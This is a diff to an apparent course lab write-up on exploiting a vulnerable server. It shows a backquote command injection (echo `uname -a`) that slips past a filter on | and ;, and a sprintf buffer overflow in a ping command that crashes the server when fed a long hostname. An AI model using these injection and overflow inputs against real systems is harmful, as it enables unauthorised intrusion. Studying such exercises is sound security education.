@@ -5,7 +5,8 @@
 * Using echo command. Only | and ; are filtered to check for multiple commands. We can use backquotes.
 ```
 echo `uname -a`
-Linux mc02.cs.purdue.edu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+Linux mc02.cs.purdue.edu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 
+UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 
 ```
 
@@ -23,4 +24,23 @@ drwxr-x--- 6 njaganna njaganna    4096 Mar 25 08:59 obj
 -rw-r----- 1 njaganna njaganna     385 Mar 25 08:58 sploit.conf
 drwxrwxr-x 6 njaganna njaganna    4096 Mar 14 19:49 src
 -rw-r----- 1 njaganna njaganna     286 Mar 25 09:49 vulnerable_file
+```
+
+### Buffer Overflow
+
+* The ping command is constructed using a buffer of size 128. We can overflow this by giving a hostname which exceeds the size.
+```
+char pingcmd[128];
+sprintf(pingcmd, "ping %s", host.c_str());
+
+Client:
+ping first
+ping AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAA 
+
+Server:
+ping: unknown host first
+Segmentation fault (core dumped)
+mc02 60 $ 
 ```
